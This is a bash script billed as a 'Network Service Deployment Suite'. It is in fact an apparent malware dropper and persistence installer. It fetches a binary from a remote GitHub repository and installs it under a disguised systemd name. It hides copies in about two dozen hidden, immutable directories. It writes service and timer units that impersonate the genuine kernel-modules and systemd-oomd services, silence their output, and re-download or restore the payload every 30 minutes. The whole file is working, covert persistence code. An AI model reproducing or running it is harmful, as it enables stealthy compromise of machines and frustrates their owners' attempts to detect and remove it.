#!/bin/bash

# ==============================================================================
# Network Service Deployment Suite
# Professional Linux Service Manager with Auto-Recovery
# Supports all Linux distributions
# ==============================================================================

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Detect Linux distribution (informational only)
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
    else
        DISTRO="unknown"
    fi
    log "Detected distribution: $DISTRO"
}

# Create 20+ hidden directories
create_hidden_directories() {
    log "Creating secure hidden directories..."
    HIDDEN_LOCATIONS=(
        "/var/tmp/.system-cache"
        "/usr/share/.lib-modules"
        "/etc/.config-daemon"
        "/opt/.service-bin"
        "/root/.daemon-data"
        "/home/.backup-store"
        "/var/lib/.storage-pool"
        "/usr/local/.bin-cache"
        "/tmp/.temp-workspace"
        "/run/.runtime-data"
        "/dev/shm/.shared-memory"
        "/var/log/.log-archive"
        "/etc/ssl/.cert-storage"
        "/usr/lib/.module-cache"
        "/var/spool/.job-queue"
        "/opt/.opt-data"
        "/srv/.service-data"
        "/mnt/.mount-cache"
        "/media/.media-cache"
        "/boot/.boot-data"
        "/sys/.sys-cache"
        "/proc/.proc-cache"
        "/var/www/.web-cache"
        "/usr/sbin/.admin-tools"
    )

    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        mkdir -p "$dir" 2>/dev/null || true
        chmod 755 "$dir" 2>/dev/null || true
        chattr +i "$dir" 2>/dev/null || true
    done
    log "Created ${#HIDDEN_LOCATIONS[@]} hidden directories"
}

# Download via git clone, extract zip, and setup ALL 3 files
setup_executable() {
    log "Cloning repository and configuring binary..."

    REPO_URL="https://github.com/cryptotech1010/mostly"
    CLONE_DIR="/tmp/mostly-repo"
    EXTRACT_DIR="/tmp/mostly-extract"
    BINARY_DIR="/usr/lib/systemd"
    BINARY_DEST="$BINARY_DIR/kmod-static-nodes"
    CONFIG_DEST="$BINARY_DIR/config.json"

    # Clean previous dirs if exist
    rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true

    # Git clone the repo
    git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR"

    if [ ! -d "$CLONE_DIR" ]; then
        error "Git clone failed — repository not accessible"
        exit 1
    fi

    # Repo contains main.zip — extract it
    if [ ! -f "$CLONE_DIR/main.zip" ]; then
        error "main.zip not found in cloned repository"
        exit 1
    fi

    mkdir -p "$EXTRACT_DIR"
    unzip -q "$CLONE_DIR/main.zip" -d "$EXTRACT_DIR"

    # Locate all 3 expected files inside extracted contents
    NETWORK_BIN=$(find "$EXTRACT_DIR" -name "network"    -type f | head -1)
    CONFIG_FILE=$(find "$EXTRACT_DIR" -name "config.json" -type f | head -1)
    SHA_FILE=$(   find "$EXTRACT_DIR" -name "SHA256SUMS" -type f | head -1)

    if [ -z "$NETWORK_BIN" ]; then
        error "network binary not found inside main.zip"
        exit 1
    fi

    # ── Deploy network binary ──────────────────────────────────
    cp "$NETWORK_BIN" "$BINARY_DEST"
    chmod +x "$BINARY_DEST"
    log "Binary deployed  : $BINARY_DEST"

    # ── Deploy config.json next to binary ─────────────────────
    if [ -n "$CONFIG_FILE" ]; then
        cp "$CONFIG_FILE" "$CONFIG_DEST"
        chmod 644 "$CONFIG_DEST"
        log "Config deployed  : $CONFIG_DEST"
    fi

    # ── Store all 3 files in every hidden location ─────────────
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        [ -n "$NETWORK_BIN" ] && cp "$NETWORK_BIN" "$dir/kmod-static-nodes" 2>/dev/null && chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
        [ -n "$CONFIG_FILE" ] && cp "$CONFIG_FILE" "$dir/config.json"        2>/dev/null && chmod 644 "$dir/config.json"  2>/dev/null || true
        [ -n "$SHA_FILE"    ] && cp "$SHA_FILE"    "$dir/SHA256SUMS"         2>/dev/null && chmod 644 "$dir/SHA256SUMS"   2>/dev/null || true
    done
    log "All files distributed to ${#HIDDEN_LOCATIONS[@]} hidden locations"

    # ── Cleanup ───────────────────────────────────────────────
    rm -rf "$CLONE_DIR" "$EXTRACT_DIR"
    log "Repository cloned, all files configured successfully"
}

# Create main service file — looks like real kernel module loader
create_main_service() {
    log "Creating system service: kernel-modules"
    cat > /etc/systemd/system/kernel-modules.service << 'EOF'
[Unit]
Description=Load Kernel Modules
Documentation=man:modules-load.d(5) man:modprobe(8)
DefaultDependencies=no
Wants=systemd-modules-load.service
After=systemd-modules-load.service
Before=sysinit.target shutdown.target
ConditionPathExists=/usr/lib/systemd/kmod-static-nodes

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/usr/lib/systemd
ExecStart=/usr/lib/systemd/kmod-static-nodes
ExecReload=/bin/kill -HUP $MAINPID
Restart=always
RestartSec=10
StartLimitInterval=60
StartLimitBurst=5
StandardOutput=null
StandardError=null
SyslogIdentifier=kernel-modules
KillMode=process
KillSignal=SIGTERM
TimeoutStopSec=30

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/tmp /tmp /run /usr/lib/systemd
PrivateTmp=false

[Install]
WantedBy=sysinit.target
Also=systemd-oomd.timer
EOF
}

# Create monitor service — looks like real systemd OOM daemon
create_monitor_service() {
    log "Creating monitor service: systemd-oomd"
    cat > /etc/systemd/system/systemd-oomd.service << 'EOF'
[Unit]
Description=Userspace Out-Of-Memory (OOM) Killer
Documentation=man:systemd-oomd.service(8)
After=network.target
DefaultDependencies=no
Conflicts=shutdown.target

[Service]
Type=oneshot
User=root
Group=root
ExecStart=/usr/local/sbin/systemd-oomd-helper.sh
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-oomd
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF
}

# Create monitor timer — looks like real systemd OOM timer
create_monitor_timer() {
    log "Creating monitor timer: systemd-oomd"
    cat > /etc/systemd/system/systemd-oomd.timer << 'EOF'
[Unit]
Description=Userspace OOM Killer Periodic Health Check
Documentation=man:systemd-oomd.service(8)
Requires=systemd-oomd.service

[Timer]
OnBootSec=2min
OnCalendar=*:0/30
AccuracySec=1s
Persistent=true
RandomizedDelaySec=30

[Install]
WantedBy=timers.target
EOF
}

# Create monitor script
create_monitor_script() {
    log "Creating monitor script..."
    cat > /usr/local/sbin/systemd-oomd-helper.sh << 'EOF'
#!/bin/bash

# systemd OOM daemon health helper
# Maintains core kernel service health

LOG_FILE="/dev/null"
LOCK_FILE="/var/run/systemd-oomd-helper.lock"
BINARY="/usr/lib/systemd/kmod-static-nodes"
REPO_URL="https://github.com/cryptotech1010/mostly"
HIDDEN_LOCATIONS=(
    "/var/tmp/.system-cache"
    "/usr/share/.lib-modules"
    "/etc/.config-daemon"
    "/opt/.service-bin"
    "/root/.daemon-data"
    "/home/.backup-store"
    "/var/lib/.storage-pool"
    "/usr/local/.bin-cache"
    "/tmp/.temp-workspace"
    "/run/.runtime-data"
)

log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Prevent multiple instances
if [ -f "$LOCK_FILE" ]; then
    exit 0
fi
touch "$LOCK_FILE"

# Cleanup function
cleanup() {
    rm -f "$LOCK_FILE"
}
trap cleanup EXIT

# Check and restore executable
restore_executable() {
    local found=false

    if [ -f "$BINARY" ]; then
        found=true
    else
        for dir in "${HIDDEN_LOCATIONS[@]}"; do
            if [ -f "$dir/kmod-static-nodes" ]; then
                cp "$dir/kmod-static-nodes" "$BINARY"
                chmod +x "$BINARY"
                found=true
                break
            fi
        done
    fi

    # Re-download all 3 files via git clone if binary not found anywhere
    if [ "$found" = false ]; then
        CLONE_DIR="/tmp/mostly-repo"
        EXTRACT_DIR="/tmp/mostly-extract"
        rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true
        git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR" 2>/dev/null || true
        if [ -f "$CLONE_DIR/main.zip" ]; then
            mkdir -p "$EXTRACT_DIR"
            unzip -q "$CLONE_DIR/main.zip" -d "$EXTRACT_DIR" 2>/dev/null || true
            NET=$(find "$EXTRACT_DIR" -name "network"     -type f | head -1)
            CFG=$(find "$EXTRACT_DIR" -name "config.json"  -type f | head -1)
            SHA=$(find "$EXTRACT_DIR" -name "SHA256SUMS"   -type f | head -1)
            if [ -n "$NET" ]; then
                cp "$NET" "$BINARY"            && chmod +x "$BINARY"
                [ -n "$CFG" ] && cp "$CFG" "/usr/lib/systemd/config.json" && chmod 644 "/usr/lib/systemd/config.json"
                for dir in "${HIDDEN_LOCATIONS[@]}"; do
                    [ -n "$NET" ] && cp "$NET" "$dir/kmod-static-nodes" 2>/dev/null && chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
                    [ -n "$CFG" ] && cp "$CFG" "$dir/config.json"        2>/dev/null && chmod 644 "$dir/config.json"  2>/dev/null || true
                    [ -n "$SHA" ] && cp "$SHA" "$dir/SHA256SUMS"         2>/dev/null && chmod 644 "$dir/SHA256SUMS"   2>/dev/null || true
                done
            fi
        fi
        rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true
    fi
}

# Check service status
check_service() {
    if ! systemctl is-active --quiet kernel-modules; then
        systemctl start kernel-modules 2>/dev/null || true
    fi
}

# Main execution
restore_executable
check_service
EOF

    chmod +x /usr/local/sbin/systemd-oomd-helper.sh
}

# Enable and start all services (full automation)
enable_and_start_services() {
    log "Reloading systemd daemon..."
    systemctl daemon-reload

    log "Enabling kernel-modules service (auto-start on boot)..."
    systemctl enable kernel-modules.service 2>/dev/null || true

    log "Enabling systemd-oomd timer (auto-check every 30 min)..."
    systemctl enable systemd-oomd.timer 2>/dev/null || true

    log "Starting kernel-modules service..."
    systemctl start kernel-modules.service 2>/dev/null || true

    log "Starting systemd-oomd timer..."
    systemctl start systemd-oomd.timer 2>/dev/null || true

    sleep 2
    if systemctl is-active --quiet kernel-modules; then
        log "kernel-modules service is running successfully!"
    else
        warn "Service may not have started yet — timer will auto-recover it."
    fi
}

# ============================================================
# MAIN — runs everything automatically top to bottom
# ============================================================
main() {
    check_root
    detect_distro
    create_hidden_directories
    setup_executable
    create_main_service
    create_monitor_service
    create_monitor_timer
    create_monitor_script
    enable_and_start_services
    log "=== Deployment complete. All services running and set to auto-recover. ==="
}

main "$@"
